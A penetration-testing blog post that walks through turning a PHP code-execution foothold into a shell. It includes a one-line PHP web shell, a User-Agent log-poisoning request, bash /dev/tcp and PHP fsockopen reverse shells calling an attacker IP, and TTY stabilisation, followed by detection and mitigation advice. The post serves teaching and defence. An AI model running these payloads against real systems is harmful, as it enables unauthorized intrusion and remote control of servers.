---
title: "php2shell: turning a PHP foothold into an interactive shell"
date: 2026-10-28T11:00:00
tags: ["web", "php", "rce", "post-exploitation", "methodology"]
summary: "How a PHP code-execution primitive becomes a stable interactive shell — the pipeline, the common primitives, and, more importantly, how to shut each one down."
---

> `giuskywalker@death-star:~$ cat ./notes/php2shell.md`

"php2shell" isn't a single tool — it's the **pipeline** every web pentester runs
in their head the moment they land a PHP code-execution primitive: how do I turn
*this one awkward way of running code* into a shell I can actually work in?

On HackTheBox boxes and in real engagements the chain looks the same every time.
This is that chain, written down — with minimal, illustrative PoCs — and, because
this is a blog I'd want my own blue team to read, a mitigation for every step.

> **Scope.** Everything here is for **authorized** testing — labs, CTFs, and
> engagements with a signed scope. The payloads are deliberately minimal and
> widely documented; the point is to understand the mechanism well enough to
> *detect and break it*.

## The pipeline

![php2shell pipeline — primitive to web shell to reverse shell to a stable TTY](/diagrams/php2shell-pipeline.svg)

Four stages:

1. **A code-exec primitive** — some way to get PHP to run your input.
2. **A minimal web shell** — prove execution over HTTP, one parameter.
3. **A reverse shell** — a real interactive session that calls back to you.
4. **A stabilized TTY** — job control, tab-completion, and working `su`/`sudo` prompts.

Most of the skill is in stage 1. Stages 2–4 are muscle memory.

## Stage 1 — the primitives

### Unrestricted file upload

The classic. The app lets you upload a `.php` file (or you bypass a weak
extension/`Content-Type` check) into a web-reachable directory.

```php
// shell.php — the smallest thing that proves execution
<?php system($_GET['c']); ?>
```

```bash
curl 'https://target/uploads/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why it works:** the upload handler trusts the client-supplied filename and
serves the directory with PHP execution enabled.

### LFI → RCE via log poisoning

When you can include a local file but not upload one, you make the server write
your PHP *for* you. The web server logs attacker-controlled fields (like the
`User-Agent`) verbatim — so you poison a log, then include it.

![LFI to RCE via log poisoning — plant PHP in the User-Agent, then include the log](/diagrams/php2shell-lfi2rce.svg)

```http
GET / HTTP/1.1
Host: target
User-Agent: <?php system($_GET['cmd']); ?>
```

```bash
# now include the poisoned log through the LFI
curl 'https://target/?page=/var/log/apache2/access.log&cmd=id'
```

On modern targets the cleaner variant is a **PHP filter chain** (`php://filter`
with chained `convert.*` encoders) that synthesizes a payload entirely in the
`page` parameter — no writable log needed. Same idea, no disk artifact.

**Why it works:** user input reaches `include()`/`require()` without being
constrained to an allow-list of known-good files.

## Stage 2 — minimal web shell

Once *any* primitive gives execution, the one-liner above is enough to confirm
it. Don't live here, though: it's stateless (every command is a fresh process,
so `cd` doesn't stick), it screams in the access logs, and it dies the moment
the file is cleaned up. Treat it as a launchpad for stage 3.

## Stage 3 — reverse shell

Start a listener, then have the web shell call back to you:

```bash
# attacker
nc -lvnp 443
```

```bash
# executed through the web shell (?c=...), URL-encoded in practice
bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'
```

If `bash /dev/tcp` is unavailable, PHP itself is a fine fallback:

```bash
php -r '$s=fsockopen("10.10.14.7",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Why outbound?** Firewalls usually filter inbound to the host but allow the
server to make outbound connections — so the shell dials *out* to you.

## Stage 4 — stabilize the TTY

A raw reverse shell has no job control, no `Ctrl-C`, and no prompt for `sudo`.
Upgrade it to a real PTY:

```bash
# in the reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then background with Ctrl-Z
stty raw -echo; fg            # run on your own box
export TERM=xterm             # back in the shell
```

Now arrow keys, tab-completion, `su`, and full-screen tools (like `vim` or
`tmux`) behave. From here it's standard post-exploitation: enumerate, escalate,
pivot.

## Detection & mitigation

This is the half that matters if you're defending PHP apps.

**Kill the upload primitive**
- Store uploads **outside the web root**, or on a host that never executes PHP.
- Validate by content (magic bytes), not extension or `Content-Type`; generate
  your own random filenames.
- At the server, disable execution in upload dirs — e.g. `php_admin_flag engine off`
  for that path, or drop the PHP handler entirely.

**Kill the LFI primitive**
- Never pass user input into `include`/`require`. Map a fixed allow-list of
  identifiers → paths instead.
- Set `open_basedir`, and keep `allow_url_include = Off`.
- `realpath()` the resolved path and confirm it's inside the intended directory
  before including.

**Reduce blast radius**
- Disable dangerous functions you don't need:
  `disable_functions = system,exec,shell_exec,passthru,popen,proc_open`.
- Run PHP-FPM as a low-privilege, **non-login** user with no `sudo` rights.
- **Egress-filter** outbound traffic. If the web server can't open arbitrary
  outbound sockets, stage 3 dies — reverse shells need that callback.

**Detect the chain**
- Alert on PHP tokens (`<?php`, `system(`, `/dev/tcp`, `pty.spawn`) in request
  bodies, headers, and **log files**.
- Flag web-server processes spawning `sh`/`bash`/`nc`/`python` — a PHP worker
  launching a shell is almost never legitimate.
- Watch for new/modified `.php` files in upload paths (FIM) and for unexpected
  outbound connections from web hosts.

## Takeaways

- **php2shell is a pipeline, not a payload.** The interesting work is landing
  stage 1; the rest is repeatable.
- Every stage has a clean mitigation. Defenders don't need to catch the exact
  payload — breaking *any one link* (no exec in upload dirs, no user input in
  `include`, no outbound egress) stops the chain.
- If you only do one thing: **egress-filter your web servers**. It's the cheapest
  control that neuters the most impactful stage.

> `giuskywalker@death-star:~$ history -c  # and document the chain, not just the flag`
